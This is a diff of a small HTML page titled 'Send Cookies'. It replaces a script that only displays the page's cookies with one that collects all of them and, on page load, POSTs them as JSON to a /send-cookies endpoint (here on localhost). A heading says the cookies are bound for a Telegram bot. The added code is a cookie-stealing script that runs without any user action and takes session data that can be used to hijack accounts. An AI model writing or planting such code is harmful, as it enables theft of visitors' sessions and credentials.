@@ -1,22 +1,49 @@
-<script>
- function getCookies() {
-    const cookiePairs = document.cookie.split('; ');
-    const cookies = {};
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Cookies</title>
+    <script>
+        function getCookies() {
+            if (!document.cookie) return {};
 
-    cookiePairs.forEach(pair => {
-        const [name, value] = pair.split('=');
-        cookies[name] = decodeURIComponent(value);
-    });
+            const cookiePairs = document.cookie.split('; ');
+            const cookies = {};
 
-    return cookies;
-}
-</script>
+            cookiePairs.forEach(pair => {
+                const index = pair.indexOf('=');
+                
+                if (index === -1) {
+                    cookies[pair] = "";
+                } else {
+                    const name = pair.substring(0, index);
+                    const value = pair.substring(index + 1);
+                    cookies[name] = decodeURIComponent(value);
+                }
+            });
+
+            return cookies;
+        }
+
+        window.onload = function() {
+            const cookies = getCookies();
+
+            // Send cookies to your server
+            fetch('http://localhost:3000/send-cookies', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookies: cookies })
+            })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
 </head>
 <body>
-    <div id="cooky"></div>
-    <div id='other'></div>
- <script>
-   document.querySelector('#cooky').innerHTML=JSON.stringify(getCookies(),null,6);
-   // document.querySelector('#other').innerHTML=document.csrfToken;
- </script>
+    <h1>Send Cookies to Telegram Bot</h1>
 </body>
+</html>
